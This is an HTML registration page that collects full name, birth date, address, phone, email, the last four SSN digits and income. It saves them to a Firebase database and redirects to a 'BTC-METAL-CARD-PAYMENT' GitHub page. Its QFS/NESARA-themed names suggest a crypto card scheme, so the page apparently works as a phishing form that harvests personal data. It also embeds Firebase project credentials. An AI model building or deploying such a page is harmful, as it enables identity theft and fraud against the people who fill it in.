<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
  <link rel="icon" type="image/png" 
        href="https://github.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/blob/main/photo%201.jpg?raw=true">
  <title>Registration Form</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    /* Overlay for submission */
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.5s ease;
    }
    #overlay.show {
      opacity: 1;
      pointer-events: all;
    }
  </style>
</head>

<body class="bg-gray-100 p-6">

  <!-- Overlay -->
  <div id="overlay">
    <div class="bg-white p-6 rounded-lg shadow-lg text-center">
      <p class="text-lg font-semibold">Submitting… please wait</p>
    </div>
  </div>

  <div class="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
    <h2 class="text-2xl font-bold text-center mb-6">Registration Form</h2>

    <form id="registrationForm" class="space-y-4">

      <div>
        <label class="font-semibold">Full Legal Name</label>
        <input type="text" name="full_name" required class="w-full mt-1 p-3 border rounded-lg" />
      </div>

      <div>
        <label class="font-semibold">Date of Birth</label>
        <input type="date" name="dob" required class="w-full mt-1 p-3 border rounded-lg" />
      </div>

      <div>
        <label class="font-semibold">Gender</label>
        <select name="gender" required class="w-full mt-1 p-3 border rounded-lg">
          <option value="">Select...</option>
          <option value="male">Male</option>
          <option value="female">Female</option>
          <option value="nonbinary">Non-Binary</option>
          <option value="other">Other</option>
        </select>
      </div>

      <div>
        <label class="font-semibold">Address</label>
        <input type="text" name="address" required class="w-full mt-1 p-3 border rounded-lg" />
      </div>

      <div>
        <label class="font-semibold">Phone Number</label>
        <input type="tel" name="phone" required class="w-full mt-1 p-3 border rounded-lg" />
      </div>

      <div>
        <label class="font-semibold">Email Address</label>
        <input type="email" name="email" required class="w-full mt-1 p-3 border rounded-lg" />
      </div>

      <div>
        <label class="font-semibold">Last 4 Digit of SSN</label>
        <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" required class="w-full mt-1 p-3 border rounded-lg" />
      </div>

      <div>
        <label class="font-semibold">Annual Income Range</label>
        <select name="income_range" required class="w-full mt-1 p-3 border rounded-lg">
          <option value="">Select...</option>
          <option value="0-25k">$0 – $25,000</option>
          <option value="25k-50k">$25,000 – $50,000</option>
          <option value="50k-100k">$50,000 – $100,000</option>
          <option value="100k+">$100,000+</option>
        </select>
      </div>

      <!-- Submit Button -->
      <button type="submit" 
              class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700">
        Submit Registration
      </button>

    </form>
  </div>


  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

  <script>
    // Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyDwZys5WMw8BmTNc6BCMJcw0zORa4vFo5w",
      authDomain: "qfs-portal.firebaseapp.com",
      projectId: "qfs-portal",
      storageBucket: "qfs-portal.appspot.com",
      messagingSenderId: "296927613356",
      appId: "1:296927613356:web:b3cd0e562671224f61aa09"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Submit Handler
    document.getElementById("registrationForm").addEventListener("submit", async function(e) {
        e.preventDefault();

        const overlay = document.getElementById("overlay");
        overlay.classList.add("show");

        const data = {
            timestamp: new Date(),
            fullName: this.full_name.value,
            dob: this.dob.value,
            gender: this.gender.value,
            address: this.address.value,
            phone: this.phone.value,
            email: this.email.value,
            ssnLast4: this.ssn_last4.value,
            income: this.income_range.value
        };

        try {
            await db.collection("registrations").add(data);

            // Save name + email for auto-email
            localStorage.setItem("qfsRegistrationEmail", data.email);
            localStorage.setItem("qfsRegistrationName", data.fullName);

            setTimeout(() => {
                window.location.href =
                "https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html";
            }, 800);

        } catch (err) {
            alert("Error submitting form. Try again.");
            overlay.classList.remove("show");
            console.error(err);
        }
    });
  </script>

</body>
</html>
